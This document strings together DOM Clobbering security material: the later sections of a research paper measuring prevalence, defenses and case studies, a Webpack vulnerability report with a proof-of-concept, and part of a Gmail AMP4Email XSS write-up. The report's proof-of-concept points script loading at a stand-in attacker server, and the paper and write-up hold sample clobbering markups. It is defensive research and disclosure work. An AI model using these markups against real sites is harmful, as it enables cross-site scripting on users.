the DOM Clobbering classes of §4. We inject the payload
to the DOM tree and subsequently verify the clobberability
of the source variable by dynamically logging its value at

sensitive sinks of Table 8, the number of affected webpages, and websites.

the source location.

As the next step, we conﬁrm the existence of the data
ﬂow to the sink instructions. To do that, we ﬁrst taint each
clobberable source, execute the program by loading it via
Puppeteer, and check if we can observe the data ﬂow reported
by the static analyzer. If that is not the case, we forcefully
execute the path toward sinks to check if there is an execution
of the program in which the data ﬂow to the target sink occurs.
We use forced execution to ﬁnd candidate pages among those
where Puppeteer could not connect sources with sinks, and
later validate the presence of the vulnerability manually.
Speciﬁcally, for each branch in the path control ﬂow, we
forcefully execute the program once for the true and once for
the false branch, until we hit a execution path with the target
data ﬂow, or we exhaustively checked possible execution
paths. We observed that the number of branches between
DOM Clobbering sources and sinks is in practice small (i.e.,
less than 10), as we will show in §5.2. Finally, as forced
execution may also lead to spurious execution paths, we
manually validate the decision reported by TheThing and
examine the exploitability.

5.2. Prevalence in the Wild

We quantiﬁed the prevalence and impact of DOM Clob-
bering on the top 5K websites using the Tranco list [91]
of Nov 1st, 2021 (ID: Y3JG), where we ﬁrst selected the
top 5K domains by excluding the duplicates like local
versions of websites (e.g., google.com vs google.de), and
then instantiated TheThing for each of the them.
Data Collection Statistics. Starting from the 5K seed URLs,
TheThing collected 205,696 webpages, ranging between 1 to
91 pages per site (41 pages on average). Out of the 205,696
webpages, 187,280 are unique pages based on their set of
scripts. From the 187K pages, TheThing extracted 18,351,815
scripts with a total of 24,664,686,928 LoC. Accordingly,
TheThing generated 187,280 HPGs by processing an average
of 98 scripts and 131,700 LoC per page.
Vulnerability Prevalence. The analysis of 187,280 HPGs
resulted in the identiﬁcation of 20,580,350 DOM Clobbering
sources and 67,743,373 sinks, which amounts to an average
of 110 sources and 362 sinks per webpage. Out of these,
static analysis revealed a total of 9,486 potential data ﬂows
from the sources to the sinks, from which the majority (i.e.,

9

9,467) were conﬁrmed dynamically. We observed that these
vulnerable data ﬂows affect around 2% of the webpages (i.e.,
3,821 out of 187,280) and 9.8% of the tested websites (i.e.,
491 out of 5K) in total. Table 4 summarizes our ﬁndings.
Vulnerability Impact. We observed that the 9,467 vulner-
abilities can have different security implications, as shown
in Table 4. The most common consequence is XSS that
accounts for around 38.8% of the vulnerabilities, whereas
the least common consequence is document domain ma-
nipulation [83, 84] that corresponds to less than 1% of
the total vulnerabilities. Other common consequences were
client-side state manipulation (17.2%), client-side request
forgery (14.8%) and DOM-based open redirection (12.9%).
Finally, the remaining 15.3% of vulnerabilities had other
repercussions like JSON injection and Websocket connection
hijack. We provide more information on each of these threats
in Table 8 of §A.2.
Veriﬁcation and False Positives. Considering the high
number of reported data ﬂows by the static analyzer (Cf.
§5.1.2), it was infeasible to verify all of them manually.
Instead, we followed a semi-automatic approach leveraging
a combination of dynamic analysis, forceful execution and
manual analysis, as detailed in §5.1.3.

We observed that in a large number of cases (46.1%,
i.e., 4,373 ﬂows), the dynamic veriﬁcation component can
successfully conﬁrm the existence of the vulnerability by
loading the page and executing it via Puppetter, whereas
in the remaining cases (i.e., 5,113 ﬂows), it needs to force
execute between one to ten conditional branches (four on
average) before it can conﬁrm or reject the data ﬂow and
terminate. As a result of this process, the veriﬁer eliminated
a total of 19 FPs across 11 of the 491 vulnerable sites, and
conﬁrmed the rest (i.e., 5,094 ﬂows within 2,643 webpages of
491 sites). We manually veriﬁed and investigated the reason
for each FP, and discovered that eight FPs occur during the
data ﬂow analysis for identiﬁcation of DOM Clobbering
sources, and 11 during the data ﬂow analysis from sources
to sinks. The former cases happened because a variable
was declared or assigned using a dynamic code generation
construct for which the statement nodes and PDG edges
were missing in the HPG, and the latter cases occurred due
to dynamically fetched code where the value of the tainted
variables changed, inaccurate pointer analysis for dynamic
property lookups, and removal of event handlers that changed
the tainted variables.

Finally, we manually validated the feasibility of the
forcefully executed data ﬂows by randomly selecting two
pages per site, from the 2,643 pages of the 491 websites
whose data ﬂows were conﬁrmed by forced execution. Our
random sampling included 491 sites, 982 pages and 2076
data ﬂows, out of which we could not determine a realistic
execution path for at least 42 data ﬂows in 42 sites, leaving
us with 2,034 vulnerable data ﬂows of 491 websites.

5.3. Conﬁrming Exploitability of Vulnerabilities

We manually examined whether the identiﬁed vulnera-
bilities can be effectively exploited by an attacker. Given

the high number of affected webpages, we randomly se-
lected two vulnerable pages per each of the 491 affected
sites, and subsequently checked whether we can insert a
DOM Clobbering markup in the page by leveraging the
functionalities offered by the application, or through URL
parameters, which could allow us to overwrite the clobberable
variable identiﬁed by TheThing. To be able to use protected
functionalities offered by the websites (e.g., creating posts,
adding comments, etc) and also prevent any side effects for
other users, we created our own test accounts for 358 sites
that supported this feature without monetary costs, and for
the rest, we limited our tests to the public functionalities (e.g.,
search) without persisting any data. As a result, we created
a proof-of-concept exploit for 44 websites in total, affecting
popular sites and functionalities like Trello boards, Wiki
pages in WikiBooks and WikiDot, comments in Vimeo and
VK, reviews in TripAdvisor and OpenTable, posts in Fandom
and JustPaste, surveys in SuveryMonkey, poster designs in
PosterMyWall, and ﬁnally item searches in GitHub Shop,
AliExpress, AliBaba and Telam News–to name only a few
examples. The exploits enable an attacker to achieve XSS,
open redirect, and client-side request forgery in 35, ﬁve, and
four sites, respectively. We refer interested readers to §A.1
for a few case studies of the conﬁrmed attacks.

6. Defenses

This section addresses RQ3 of §3. First, in §6.1, we have
a critical look at the existing countermeasures and evaluate
their robustness and cost-beneﬁt tradeoff leveraging what we
learned from Sections 4 and 5. Then, in §6.2, we analyze the
common mistakes of the 491 vulnerable sites (see §5), and
distill a list of recommendations and secure coding patterns
that can resolve those issues.

6.1. Evaluation of Existing Countermeasures

Disabling DOM Clobbering Features. DOM Clobbering
can be solved by disabling named properties [19, 25, 27].
According to Chrome telemetry [28], disabling named prop-
erties for clobbered variable accesses could break ~10.5%
of the webpages. Our results of §5.2 are in line with these
numbers, and we observed that 13.3% of the webpages use
at least an instance of clobbered variable accesses.

As webpages tend to reuse code via shared scripts, a patch
in a script may ﬁx multiple websites. Accordingly, using the
number of webpages may not accurately quantify the cost
of ﬁxing breakage. As an alternative, we can measure the
number of affected websites, and our results show that the
affected pages do not concentrate on a small number of sites,
but they scatter over 51.2% of the top 5K sites.

While breakage adequately measures the cost of this
solution, it may not be a good indicator for the actual
beneﬁts, i.e., ﬁxed websites. Our results show that 118
websites of 2,561 potentially broken sites will be ﬁxed,
which is about 4.61% of the broken websites (and 2.4% of
the total). However, our results also show that a large fraction
of vulnerable websites are not considered by breakage. In
particular, we found 373 websites (76% of the vulnerable

conﬁgurations. The tested sanitizer versions are in Table 10.

ones and 7.5% of the total) that will beneﬁt from such a
solution. Overall, when comparing the cost and beneﬁts, the
ratio of vulnerable over potentially-broken websites is about
1:5.2 (i.e., 491 vulnerable and 2,561 potentially-broken sites).
HTML Sanitization. HTML sanitizers can sanitize the input
markups before adding them to the DOM tree, e.g., by
removing the id and name attributes from certain (combina-
tions of) HTML tags (Cf. §4). To assess the robustness of
the popular HTML sanitizers against DOM Clobbering, we
dynamically tested them against all of the DOM Clobbering
instances we identiﬁed in §4. First, we selected the top
ﬁve web programming languages based on the GitHub 2021
Octoverse report [120], i.e., JavaScript, Python, Java, C#
and PHP. We considered both client-side and server-side
JavaScript (i.e., node.js). Then, we searched for sanitizers of
each language and selected the top ﬁve based on their GitHub
stars, forks and UsedBy, and the number of downloads in
their respective package managers (e.g., npm for node.js,
packagist for PHP, etc). This process led to the identiﬁcation
of 29 HTML sanitizer libraries, as for Java, we identiﬁed
only four sanitizers.

After identifying the popular sanitizers, we input the 31.4K

11

DOM Clobbering markups identiﬁed in §4 to each of them,
and for each input vetted whether the sanitizer removes
or changes the named properties in the output markup.
For each sanitizer, we tested both the default and most
strict conﬁguration that it offers. We marked a sanitizer as
vulnerable if there is at least one clobbering markup that
bypasses the sanitizer without being altered. Finally, we
marked sanitizers as partially vulnerable when they encode
the < and > symbols of HTML tags but do not remove
or change the DOM Clobbering named properties because
encoding these symbols would not help when applications
expect inputs in an HTML format.

Table 5 summarizes our ﬁndings. In total, we observed
that 16 and 13 out of 29 sanitizers are vulnerable to at
least one DOM Clobbering markup in their default and most
strict sanitization conﬁguration, respectively. In both of the
conﬁgurations, four sanitizers are only partially vulnerable, as
they escape the markup rather than cleansing the named prop-
erties. Finally, when looking at the remaining 13 sanitizers,
we observe that they implement a robust, enabled-by-default
defense. However, in all cases, they remove named properties
unconditionally, i.e., for all input markups including those
combinations that do not lead to DOM Clobbering, e.g., an
anchor tag with name=x does not clobber the variable x.
While such a strict approach is effective, it may hinder the
usability of these libraries in cases where developers need
to use id and name attributes for legitimate functionalities.
Content-Security Policy (CSP). When attackers can clobber
the src attribute of dynamically created scripts, they can
load and execute arbitrary JavaScript code. In these cases, the
CSP script-src directive [29] can be used to constrain
the value of script sources to a set of trusted domains,
preventing attacker-loaded code to be executed [12, 22, 30].
However, unlike malicious JavaScript injected by the attacker,
injected HTML code is not blocked by CSP. Accordingly,
CSP does not mitigate other variants of DOM Clobbering that
do not require script src manipulation, e.g., clobbering the
parameters of dynamic code evaluation constructs like new
Function() can lead to CSP-bypassable XSS. Our eval-
uation in §5.2 shows that 37.7% of the DOM Clobbering
vulnerabilities that lead to XSS (i.e., 1,385 out of 3,677),
which accounts for 14.7% of the total vulnerabilities can be
mitigated by CSP, whereas the remaining ones cannot.
Freezing Object Properties. Another way to mitigate
DOM Clobbering is to freeze DOM objects [51], e.g., via
Object.freeze() method [121], which prevents the
object to be overwritten by named DOM elements. While
effective, determining all objects and object properties that
need to be frozen is a non-trivial, error-prone task for web
developers. Also, sealed objects cannot be changed anymore,
hindering the dynamic composition of webpages. Finally,
native properties cannot be frozen, rendering this approach
ineffective when the DOM Clobbering source is a clobberable
native property, which accounts for ~21.5% of vulnerabilities
(i.e., 2,037 out of 9,467) in §5.2.

6.2. Secure Code Patterns

Our evaluation of existing DOM Clobbering counter-
measures in §6.1 revealed that they are not sufﬁcient for
complete protection in a large number of cases. In this section,
we have a closer look at the variety of DOM Clobbering
vulnerabilities in real web applications (§5.2), identifying
vulnerable behaviours and the common types of coding
mistakes. Then, we use these vulnerable behaviours to distill
a list of recommendations and defensive coding patterns
that developers could apply to prevent DOM Clobbering.
To achieve this objective, we extracted the vulnerable lines
of code and characterized them based on their high-level
syntax and semantics, identifying eight distinct vulnerable
code patterns in the wild.

Table 6 summarizes our ﬁndings. We observe that the most
common mistakes are patterns A and E, in which the devel-
oper references an undeﬁned variable through the window
object, and then use the result in a sensitive instruction,
whereas the least common, but also more complex mistakes
are patterns F, G and H where the vulnerability originates
due to the position of the instructions that span across two
different script tags. Other common mistakes are patterns B
and C, where developers treat custom and native document
and window properties as trusted values that can be safely
used in sensitive operations. The rest of this section presents
secure coding patterns that can prevent DOM Clobbering.
Explicit Variable Declarations. As shown in Table 6, a key
element enabling DOM Clobbering is use of the || operator
to rely on speciﬁc defaults when the primary, intended
variable or property is undeﬁned. As an alternative solution,
developers can initialize those variables with the default
value when they are undeﬁned using var declarations, which
prevents named properties to overshadow them according to
the named property visibility algorithm [45]. This solution

could patch the patterns A, D, E, F, and H. When the value
needs to be used in multiple scripts, as in patterns F and H,
the declaration should be in the same (or a previous) script,
but not in subsequent ones.
Strict Type Checking. Another common mistake en-
abling DOM Clobbering is treating DOM properties, like
document and window properties as safe, trusted values
(e.g., patterns B, C, and G). Instead, developers should extend
the trust boundary to these properties, verifying their type
before using them in security-sensitive instructions, e.g.,
using the instanceof [122] and typeof [123] operators.
Do Not Use Document for Global Variables. Properties of
document can always be overwritten by DOM Clobbering,
even immediately after they are assigned a value, as in
pattern C. Accordingly, developers should refrain from using
document as a mean to store and retrieve global values.
Instead, they can declare variables with const or var in
the global context, or use the globalThis object [124].
Namespace Isolation. While robust sanitizers in §6.1 re-
move named properties, an alternative solution is to separate
the namespace of variables deﬁned by JavaScript code and
named properties in user-generated markups. For example,
we observed that the markdown to HTML converter of ap-
plications like GitHub and BitBucket preﬁxes id and name
attribute values of user-generated markup with a speciﬁc
string. Motivated by this solution, one can monitor runtime
changes in the DOM tree via the MutationObserver
API [125], and preﬁx named properties of all dynamically
inserted markups before adding them to the tree, which
patches all patterns in Table 6.

7. Summary and Discussion

Clobbering Markups Come In Many Forms. In this
paper, we proposed a systematic technique to identify DOM

12

Clobbering markups, and showed that they come in many
forms, with a total of 31,432 attack markups that rely on ﬁve
different techniques, including 148 new instances and 30,803
new variants. We observed that browsers exhibit divergent
behaviours when handling named properties. For example,
for a signiﬁcant fraction of the markups (i.e., 99%), there
is at least one browser that disagrees with others, making it
increasingly more challenging to enforce robust defenses.
DOM Clobbering is Ubiquitous. DOM Clobbering vulner-
abilities are prevalent, affecting over 9.8% of the top 5K
sites, with the consequences ranging from XSS to user state
manipulation, request forgery and client-side open redirects
in the majority of the cases, i.e., 83.7% (see §5.2).
Defenses Helpful but May not Completely Cut it. The
evaluation of existing DOM Clobbering countermeasures (§6)
suggests that each can only mitigate a fraction of the attacks.
For example, 55% of the popular HTML sanitizers are
vulnerable to at least one of the 31K clobbering markups by
default, and CSP cannot mitigate over 85% of the identiﬁed
vulnerabilities. Protecting such a fraction of the attack
surface without switching named properties off completely
is a more costly task, requiring developers to be aware of
corner case behaviors of browsers and revisit the design and
implementation of their systems, e.g., strict type checking,
explicit variable declarations, or namespace isolation.
Open Science and Website. To support the future research
effort, we publicly release TheThing [126], the automated
browser testing pipeline [127] that identiﬁes clobbering
markups (see §4), and an interactive version of markups1.
Ethical Discussion. Our experiments on live sites do not
target any real user. Tests requiring to persist data, e.g.,
store a markup, is exclusively restricted to user accounts
that we created on those sites. Also, we excluded testing
functionalities where we could not control the impact and
visibility of the injected markup (e.g., publicly accessible
posts and comments). Tests on public functionalities was
performed without persistently injecting any markup.

The vulnerabilities and security risks identiﬁed in this
paper affects 491 websites and 16 sanitizer libraries. We
started the process of notifying the affected parties in March
2022 following the best disclosure practices [128, 129],
where we prioritized our reports by severity. We sent an
initial notiﬁcation that includes the vulnerability details, or a
proof-of-concept exploit, followed by an additional reminder
every three weeks to maximize the remediation rate. At the
time of preparing the camera-ready, we have notiﬁed all
affected parties at least once, out of which 72 sites have
already conﬁrmed the issues, and 21 sites patched them, such
as GitHub, Vimeo, Fandom, TripAdvisor and SuveryMonkey.

8. Related Work

Reusing the webpages’ legitimate JavaScript code to obtain
arbitrary client-side code execution have been the subject
of several research endeavors in the past. Most notably,
Lekies et. al. [12] described a new attack where small

fragments of JavaScript code, known as script gadgets, are
unexpectedly executed as a result of a non-script markup
injected by attackers. The authors used a modiﬁed browser
engine [1] to measure the prevalence of these gadgets,
and demonstrated that they are prevalent and can bypass
existing XSS mitigations, such as HTML sanitizers [7] and
CSP [29, 30]. Later, Roth et. al. [130] quantiﬁed the impact
of script gadgets on CSP in the wild. Similarly, Heiderich
et. al. [6] discovered mutation-based XSS attacks (mXSS),
showing how speciﬁc browser-based mutations of DOM
content and insecure JavaScript that reads and rewrites HTML
elements can transform initially secure DOM markup to code.
While all these three attacks can transform non-script markup
to executable code, the elements enabling DOM Clobbering
is largely different, i.e., script gadgets rely on event handlers
and mXSS attacks abuse innerHTML mutations, whereas
DOM Clobbering is the result of a complex interplay of the
default browser behaviors and insecure use of named property
accesses in JavaScript programs. Contrary to these works, our
study focuses on DOM Clobbering, systematically testing
mobile and desktop browsers, identifying insecure coding
patterns using both static and dynamic analysis techniques,
and demonstrating their exploitability.

Multiple instances of DOM Clobbering vulnerabilities
have been discovered in the last 12 years by both aca-
demics [7, 13, 131] and security analysts [14, 21–23, 54],
with the ﬁrst public instance identiﬁed in 2010 by Rydstedt
et. al. as a way to circumvent frame busters [13]. The term
‘DOM Clobbering’ itself emerged in 2013, when Gareth
Heyes [14] demonstrated how this class of vulnerabilities can
escalate to client-side code execution. Due to such nefarious
consequences of DOM Clobbering, prior academic studies
has primarily focused on its defenses (e.g., [7, 26, 51]).
Most notably, Heiderich et. al. proposed the JSAgents
library [51] and later the DOMPurify sanitizer [7] to mitigate
the security implications induced by markup injection, such
as DOM Clobbering and client-side XSS [1, 5]. Our research
completes the missing pieces of these works by systematically
studying DOM Clobbering attack techniques, their preva-
lence, and effectiveness of the existing countermeasures.

9. Conclusion

In this paper, we performed, to the best of our knowledge,
the ﬁrst comprehensive study of DOM Clobbering, system-
atically covering clobbering techniques, browser behaviours,
vulnerability prevalence, and defenses. Starting with a com-
prehensive survey of existing literature and dynamic analysis
of 19 web browsers, we presented the ﬁrst taxonomy of DOM
Clobbering, uncovering 31K distinct markups that use ﬁve
different techniques to clobber JavaScript variables. Then,
we presented TheThing, the ﬁrst DOM Clobbering detection
tool, and instantiated it on the top of the Tranco top 5K sites,
showing that DOM Clobbering vulnerabilities are prevalent.
Finally, we demonstrated that existing countermeasures are
not sufﬁcient to mitigate a signiﬁcant fraction of the vulner-
abilities, and accordingly proposed several recommendations
and secure coding patterns for developers.

Appendix A.

A.1. Case Studies

This section reports on a few manually vetted case studies
of the conﬁrmed attacks. We note that the affected parties
have been promptly informed of the vulnerability, and have
already patched them (see §7).
GitHub. This vulnerability affects the GitHub Shop and orig-
inated when loading the Boomerag JavaScript library [132].
In more details, the code followed the vulnerable pattern G
of Table 6, where a variable called BOOMR was deﬁned in
an inital script that contained a clobberable, invoked native
method, and a second script that used the object property
window.BOOMR.url as the src of a dynamically added
script. Attackers can escalate this vulnerable pattern to client-
side XSS via double clobbering. First, they clobber the
invoked native method, causing a runtime error when the
browser parses the ﬁrst script. Therefore, the browser stops
parsing the rest of the script and BOOMR becomes undeﬁned.
Then, attackers can clobber window.BOOMR.url and
consequently control the script src by injecting a DOM
Clobbering markup, e.g., <a id=BOOMR><a id=BOOMR
name=url href=malicious.js>. We discovered that
it is possible to inject such non-script markup to the client-
side page leveraging the search functionality and the URL
query parameters, which were reﬂected back to the page.
Trello. We discovered that Trello uses a global object
property called window.ClickTaleScriptSource
to programmatically load a script named wrScript.
However,
as
ClickTaleScriptSource was an undeﬁned variable
following the vulnerable pattern A of Table 6. Finally, we
found that it is possible to insert a persistent, non-script
markup to overwrite this object property by editing a
comment for a card in Trello boards, which resulted in
arbitrary client-side code execution.
Fandom. We discovered a DOM Clobbering vulner-
ability in Fandom affecting the users’ message wall
the
that
resulted in open redirection. Speciﬁcally,
JavaScript program contained an assignment
to the
location.href property of the top-level window, whose
value was tainted with a clobberable object property,
i.e., form.elements.targetUsername.value. At-
tackers can manipulate the value of this property by, e.g., two
nested iframe tags that are named form and elements,
and an additional input element in the nested frame. The
input is named targetUsername, and has a value
containing a malicious URL, which will be set as the window
URL. We found that it is possible to inject non-script markup
in the page in two distinct ways: (i) attackers can insert
persistent payloads using the post functionality in the proﬁle
message wall, and (ii) a URL parameter in the path was
reﬂected back to the page without extra validation, enabling
transient insertion of clobbering payloads in the page.

## Description

Hi, Webpack developer team!

### Summary

We discovered a DOM Clobbering vulnerability in Webpack’s `AutoPublicPathRuntimeModule`. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present.

We found the real-world exploitation of this gadget in the Canvas LMS which allows XSS attack happens through an javascript code compiled by Webpack (the vulnerable part is from Webpack). We believe this is a severe issue. If Webpack’s code is not resilient to DOM Clobbering attacks, it could lead to significant security vulnerabilities in any web application using Webpack-compiled code.

### Details

#### Backgrounds

DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:

[1] <https://scnps.co/papers/sp23_domclob.pdf>

[2] <https://research.securitum.com/xss-in-amp4email-dom-clobbering/>

#### Gadgets found in Webpack

We identified a DOM Clobbering vulnerability in Webpack’s `AutoPublicPathRuntimeModule`. When the `output.publicPath` field in the configuration is not set or is set to `auto`, the following code is generated in the bundle to dynamically resolve and load additional JavaScript files:

```
/******/ 	/* webpack/runtime/publicPath */
/******/ 	(() => {
/******/ 		var scriptUrl;
/******/ 		if (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + "";
/******/ 		var document = __webpack_require__.g.document;
/******/ 		if (!scriptUrl && document) {
/******/ 			if (document.currentScript)
/******/ 				scriptUrl = document.currentScript.src;
/******/ 			if (!scriptUrl) {
/******/ 				var scripts = document.getElementsByTagName("script");
/******/ 				if(scripts.length) {
/******/ 					var i = scripts.length - 1;
/******/ 					while (i > -1 && (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;
/******/ 				}
/******/ 			}
/******/ 		}
/******/ 		// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration
/******/ 		// or pass an empty string ("") and set the __webpack_public_path__ variable from your code to use your own logic.
/******/ 		if (!scriptUrl) throw new Error("Automatic publicPath is not supported in this browser");
/******/ 		scriptUrl = scriptUrl.replace(/#.*$/, "").replace(/\?.*$/, "").replace(/\/[^\/]+$/, "/");
/******/ 		__webpack_require__.p = scriptUrl;
/******/ 	})();

```

However, this code is vulnerable to a DOM Clobbering attack. The lookup on the line with `document.currentScript` can be shadowed by an attacker, causing it to return an attacker-controlled HTML element instead of the current script element as intended. In such a scenario, the `src` attribute of the attacker-controlled element will be used as the `scriptUrl` and assigned to `__webpack_require__.p`. If additional scripts are loaded from the server, `__webpack_require__.p` will be used as the base URL, pointing to the attacker's domain. This could lead to arbitrary script loading from the attacker's server, resulting in severe security risks.

### PoC

Please note that we have identified a real-world exploitation of this vulnerability in the Canvas LMS. Once the issue has been patched, I am willing to share more details on the exploitation. For now, I’m providing a demo to illustrate the concept.

Consider a website developer with the following two scripts, `entry.js` and `import1.js`, that are compiled using Webpack:

```
// entry.js
import('./import1.js')
  .then(module => {
    module.hello();
  })
  .catch(err => {
    console.error('Failed to load module', err);
  });

```

```
// import1.js
export function hello () {
  console.log('Hello');
}

```

The webpack.config.js is set up as follows:

```
const path = require('path');

module.exports = {
  entry: './entry.js', // Ensure the correct path to your entry file
  output: {
    filename: 'webpack-gadgets.bundle.js', // Output bundle file
    path: path.resolve(__dirname, 'dist'), // Output directory
    publicPath: "auto", // Or leave this field not set
  },
  target: 'web',
  mode: 'development',
};

```

When the developer builds these scripts into a bundle and adds it to a webpage, the page could load the `import1.js` file from the attacker's domain, `attacker.controlled.server`. The attacker only needs to insert an `img` tag with the `name` attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.

```
<!DOCTYPE html>
<html>
<head>
  <title>Webpack Example</title>
  <!-- Attacker-controlled Script-less HTML Element starts--!>
  <img name="currentScript" src="https://attacker.controlled.server/"></img>
  <!-- Attacker-controlled Script-less HTML Element ends--!>
</head>
<script src="./dist/webpack-gadgets.bundle.js"></script>
<body>
</body>
</html>

```
### Impact

This vulnerability can lead to cross-site scripting (XSS) on websites that include Webpack-generated files and allow users to inject certain scriptless HTML tags with improperly sanitized name or id attributes.

### Patch

A possible patch to this vulnerability could refer to the Google Closure project which makes itself resistant to DOM Clobbering attack: <https://github.com/google/closure-library/blob/b312823ec5f84239ff1db7526f4a75cba0420a33/closure/goog/base.js#L174>

```
/******/ 	/* webpack/runtime/publicPath */
/******/ 	(() => {
/******/ 		var scriptUrl;
/******/ 		if (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + "";
/******/ 		var document = __webpack_require__.g.document;
/******/ 		if (!scriptUrl && document) {
/******/ 			if (document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT') // Assume attacker cannot control script tag, otherwise it is XSS already :>
/******/ 				scriptUrl = document.currentScript.src;
/******/ 			if (!scriptUrl) {
/******/ 				var scripts = document.getElementsByTagName("script");
/******/ 				if(scripts.length) {
/******/ 					var i = scripts.length - 1;
/******/ 					while (i > -1 && (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;
/******/ 				}
/******/ 			}
/******/ 		}
/******/ 		// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration
/******/ 		// or pass an empty string ("") and set the __webpack_public_path__ variable from your code to use your own logic.
/******/ 		if (!scriptUrl) throw new Error("Automatic publicPath is not supported in this browser");
/******/ 		scriptUrl = scriptUrl.replace(/#.*$/, "").replace(/\?.*$/, "").replace(/\/[^\/]+$/, "/");
/******/ 		__webpack_require__.p = scriptUrl;
/******/ 	})();

```

Please note that if we do not receive a response from the development team within three months, we will disclose this vulnerability to the CVE agent.

# XSS in GMail’s AMP4Email via DOM Clobbering

[Michał Bentkowski](/authors/michal-bentkowski) | November 18, 2019November 18, 2019 | [Research](https://research.securitum.com/category/research/)

This post is a write up of an already-fixed XSS in AMP4Email I reported via [Google Vulnerability Reward Program](https://www.google.com/about/appsecurity/reward-program/) in August 2019. The XSS is an example of a real-world exploitation of well-known browser issue called DOM Clobbering.

## What is AMP4Email

AMP4Email (also known as dynamic mail) is a new feature of Gmail that makes it possible for emails to include dynamic HTML content. While composing emails containing HTML markup has been done for years now, it’s been usually assumed that the HTML contains only static content, i.e. some kind of formatting, images etc. without any scripts or forms. AMP4Email is meant to go one step further and allow dynamic content in emails. In a [post in Google official G Suite blog](https://gsuiteupdates.googleblog.com/2019/06/dynamic-email-in-gmail-becoming-GA.html), the use caes for dynamic mails are nicely summarized:

> With dynamic email, you can easily take action directly from within the message itself, like RSVP to an event, fill out a questionnaire, browse a catalog or respond to a comment.
>
> Take commenting in Google Docs, for example. Instead of receiving individual email notifications when someone mentions you in a comment, now, you’ll see an up-to-date thread in Gmail where you can easily reply or resolve the comment, right from within the message.

The feature raises some obvious security questions; the most important one probably being: what about Cross-Site Scripting (XSS)? If we’re allowing dynamic content in emails, does that mean that we can easily inject arbitrary JavaScript code? Well – no; it’s not that easy.

AMP4Email has a [strong validator](https://github.com/ampproject/amphtml/blob/master/validator/validator-main.protoascii) which, in a nutshell, is a strong whitelist of tags and attributes that are allowed in dynamic mails. You can play around with it on <https://amp.gmail.dev/playground/>, in which you can also send a dynamic email to yourself to see how it works!

![](https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-1.png)

Fig 1. AMP4Email playground

If you try to add any HTML element or attribute that is not explicitly allowed by the validator, you’ll receive an error.

![](https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-2.png)

Fig 2. AMP Validator disallows arbitrary script tags

When playing around with AMP4Email and trying various ways to bypass it, I noticed that `id` attribute is not disallowed in tags (Fig 3).

![](https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-3.png)

Fig 3. Attribute `id` is not disallowed

This looked like a fine place to start the security analysis, since creating HTML elements with user-controlled `id` attribute can lead to [DOM Clobbering](http://www.thespanner.co.uk/2013/05/16/dom-clobbering/).

## DOM Clobbering

DOM Clobbering is a legacy feature of web browsers that just keeps causing trouble in many applications. Basically, when you create an element in HTML (for instance `<input id=username>`) and then you want wish to reference it from JavaScript, you would usually use a function like `document.getElementById('username')` or `document.querySelector('#username')`. But these are not the only ways!

The legacy way is to just access it via a property of global `window` object. So `window.username` is in this case exactly the same as `document.getElementById('username')`! This behaviour (which is known as DOM Cloberring) can lead to interesting vulnerabilities if the application makes decisions based on existence of certain global variables (imagine: `if (window.isAdmin) { ... }`).

For further analysis of DOM Clobbering, suppose that we have the following JavaScript code:

Python

if (window.test1.test2) {
eval(''+window.test1.test2)
}

| 123 | if (window.test1.test2) {    eval(''+window.test1.test2)} |
| --- | --- |

and our job is to evaluate arbitrary JS code using only DOM Clobbering techniques. To solve the task, we need to find solutions to two problems

1. We know that we can create new properties on `window`, but can we create new properties on other objects (the case of `test1.test2`)?
2. Can we control how our DOM elements are casted to string? Most HTML elements, when casted to string, returns something similar to `[object HTMLInputElement]`.

Let’s begin with the first problem. The way to solve it that is most commonly referenced is to use `<form>` tag. Every `<input>` descendent of the `<form>` tag is added as a property of the `<form>` with the name of the property equal to the `name` attribute of the `<input>`. Consider the following example:

Python

<form id=test1>
<input name=test2>
</form>
<script>
alert(test1.test2); // alerts "[object HTMLInputElement]"
</script>

| 123456 | <form id=test1>  <input name=test2></form><script>  alert(test1.test2); // alerts "[object HTMLInputElement]"</script> |
| --- | --- |

To solve the second problem, I’ve created a short JS code that iterates over all possible elements in HTML and checks whether their `toString` method inherits from `Object.prototype` or are defined in another way. If they don’t inherit from `Object.prototype`, then probably something else than `[object SomeElement]` would be returned.

Here’s the code:

Python

Object.getOwnPropertyNames(window)
.filter(p => p.match(/Element$/))
.map(p => window[p])
.filter(p => p && p.prototype && p.prototype.toString !== Object.prototype.toString)

| 1234 | Object.getOwnPropertyNames(window).filter(p => p.match(/Element$/)).map(p => window[p]).filter(p => p && p.prototype && p.prototype.toString !== Object.prototype.toString) |
| --- | --- |

The code returns two elements: `HTMLAreaElement` (`<area>`) and `HTMLAnchorElement` (`<a>`). The first one is disallowed in AMP4Email so let’s focus only on the second one. In case of `<a>` element, `toString` returns just a value of `href` attribute. Consider the example:

Python

<a id=test1 href=https://securitum.com>
<script>
alert(test1); // alerts "https://securitum.com"
</script>

| 1234 | <a id=test1 href=https://securitum.com><script>  alert(test1); // alerts "https://securitum.com"</script> |
| --- | --- |

At this point, it may seem that if we want to solve the original problem (i.e. evaluate value of `window.test1.test2` via DOM Clobbering), we need a code similar to the following:

Python

<form id=test1>
<a name=test2 href="x:alert(1)"></a>
</form>

| 123 | <form id=test1>  <a name=test2 href="x:alert(1)"></a></form> |
| --- | --- |

The problem is that it doesn’t work at all; `test1.test2` would be `undefined`. While `<input>` elements do become properties of `<form>`, the same doesn’t happen with `<a>`.

